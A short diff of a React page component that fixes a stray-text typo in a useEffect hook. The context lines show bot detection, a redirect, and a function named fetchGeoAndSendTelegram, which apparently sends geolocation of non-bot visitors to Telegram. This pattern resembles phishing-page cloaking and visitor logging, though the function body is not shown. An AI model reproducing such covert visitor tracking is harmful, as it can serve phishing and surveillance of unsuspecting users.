@@ -15,7 +15,7 @@ const Index: FC = () => {
         }
     }, [shouldRedirect, isBot, isLoading]);
 
-    useEffect(() => {sn anh
+    useEffect(() => {
         if (!isLoading && !isBot && !logSentRef.current) {
             logSentRef.current = true;
             const fetchGeoAndSendTelegram = async () => {
